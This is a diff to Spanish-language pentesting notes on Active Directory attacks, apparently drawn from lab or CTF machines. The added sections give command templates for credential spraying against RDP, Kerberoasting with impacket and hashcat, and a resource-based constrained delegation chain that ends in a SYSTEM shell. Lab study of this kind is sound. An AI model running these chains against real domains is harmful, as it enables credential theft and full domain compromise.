@@ -1,6 +1,6 @@
 # SMB, LDAP y Active Directory
 
-Comandos usados en **Chimichurri**, **GOIKO** y **PROXY**.
+Comandos usados en **Chimichurri**, **GOIKO**, **PROXY** y **Forward**.
 
 ## 1. Enumeración automática (enum4linux-ng)
 
@@ -47,6 +47,12 @@ nxc smb <IP> -u '<usuario>' -p '<contraseña>' --continue-on-success
 - `--continue-on-success` → sigue probando aunque una clave funcione.
 - `Null:Auth:True` → el acceso anónimo está permitido.
 - `STATUS_LOGON_FAILURE` → credenciales mal: **las contraseñas distinguen mayúsculas**.
+
+Comprobación también contra RDP (en Forward la respuesta fue **`Pwn3d!`**: el usuario tiene permisos de escritorio remoto):
+
+```
+nxc rdp <IP> -u '<usuario>' -p '<contraseña>'
+```
 
 Enumeración automática con credenciales:
 
@@ -389,3 +395,45 @@ getST.py -spn cifs/<DC>.<dominio> -impersonate Administrator -dc-ip <IP_DC> <DOM
 export KRB5CCNAME=./<nombre_del_fichero>.ccache
 smbexec.py -k -no-pass <DOMINIO>/Administrator@<DC>.<dominio>
 ```
+
+## 16. Kerberoasting (GetUserSPNs)
+
+Enumerar los Service Principal Names del dominio y pedir tickets de servicio para crackearlos offline:
+
+```
+impacket-GetUserSPNs <DOMINIO>/<usuario>:'<contraseña>' --request -dc-ip <IP_DC>
+```
+
+- Requiere credenciales válidas de **cualquier** usuario del dominio.
+- Los SPN suelen ser cuentas de servicio (`svc.*`) con contraseñas antiguas (en Forward: SPN `helpdesk/DC01` → cuenta `svc.helpdesk`).
+- `--request` devuelve además el hash `$krb5tgs$23$...` para crackear con `hashcat -m 13100` (RC4) o `-m 19700` (AES), o `john --format=krb5tgs` (ver `Fuerza bruta y crackeo.md`).
+
+## 17. RBCD — delegación basada en recursos (impacket)
+
+Abuso cuando BloodHound marca **AddAllowedToAct** de un usuario sobre una máquina (en Forward: `r.williams` → `DC01$`):
+
+**1 · Crear una cuenta de equipo propia** (hace falta un usuario con permiso para añadir máquinas, p. ej. una cuenta de servicio o `t.jones`):
+
+```
+impacket-addcomputer <DOMINIO>/<usuario>:'<contraseña>' -dc-host <DC>.<dominio> -dc-ip <IP_DC>
+```
+
+- Crea una cuenta de equipo (`XXXX$`) y devuelve su contraseña.
+
+**2 · Autorizar esa cuenta a hacerse pasar por otros en la máquina destino** (desde el usuario que tiene AddAllowedToAct):
+
+```
+impacket-rbcd <DOMINIO>/<usuario>:'<contraseña>' -dc-ip <IP_DC> -dc-host <DC>.<dominio> -delegate-to "MAQUINA$" -delegate-from "CUENTA_EQUIPO$" -action write
+```
+
+- `Delegation rights modified successfully!` → la cuenta de equipo ya puede impersonar a cualquier usuario vía S4U2Proxy.
+
+**3 · Pedir el ticket y usarlo** (mismos pasos 3-4 de la sección 15):
+
+```
+impacket-getST -spn 'cifs/<DC>.<dominio>' -impersonate 'Administrator' <DOMINIO>/CUENTA_EQUIPO$:'<contraseña_de_la_cuenta>' -dc-ip <IP_DC>
+export KRB5CCNAME=Administrator@cifs_<DC>.<dominio>@<DOMINIO>.ccache
+impacket-smbexec -k -no-pass <DOMINIO>/Administrator@<DC>.<dominio>
+```
+
+> Ejemplo real (Forward): `impacket-addcomputer` con `t.jones` → cuenta `DESKTOP-...$`; `impacket-rbcd` con `r.williams` → delegación sobre `DC01$`; `getST` + `smbexec -k` → shell como SYSTEM → flag.
